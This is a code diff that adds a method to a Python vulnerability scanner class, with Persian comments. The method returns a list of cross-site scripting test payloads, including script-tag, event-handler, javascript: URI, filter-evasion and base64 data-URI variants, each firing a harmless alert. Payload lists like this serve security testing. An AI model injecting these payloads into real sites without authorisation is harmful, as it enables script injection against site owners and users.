@@ -200,3 +200,26 @@ class VulnerabilityScanner:
                     'payload': payload,  # پیلود استفاده شده
                     'error': str(e)  # پیام خطا
                 }
+
+
+
+
+        def generate_xss_payloads(self) -> List[str]:
+            """تولید پیلودهای XSS مختلف برای تست"""
+            return [  # لیستی از پیلودهای XSS
+                "<script>alert('XSS')</script>",  # تزریق اسکریپت
+                "<img src=x onerror=alert('XSS')>",  # تزریق از طریق ویژگی onerror
+                "<svg/onload=alert('XSS')>",  # تزریق از طریق ویژگی onload
+                "javascript:alert('XSS')",  # تزریق جاوا اسکریپت
+                "\"><script>alert('XSS')</script>",  # تزریق اسکریپت با بستن تگ
+                "';alert('XSS')//",  # تزریق جاوا اسکریپت با بستن رشته و کامنت
+                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",  # تزریق اسکریپت با تگ های شکسته
+                "<<SCRIPT>>alert('XSS');//<<SCRIPT>>",  # تزریق اسکریپت با حروف بزرگ
+                "<%<!--'%><script>alert('XSS');</script -->",  # تزریق اسکریپت با استفاده از کامنت های HTML
+                "<iframe src=\"javascript:alert('XSS')\">",  # تزریق از طریق iframe
+                "<object data=\"javascript:alert('XSS')\">",  # تزریق از طریق object
+                "<svg><script>alert('XSS')</script></svg>",  # تزریق اسکریپت داخل تگ svg
+                "<math><maction xlink:href=\"javascript:alert('XSS')\">",  # تزریق از طریق math
+                "<table background=\"javascript:alert('XSS')\">",  # تزریق از طریق background
+                "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",  # تزریق از طریق data URI
+            ]
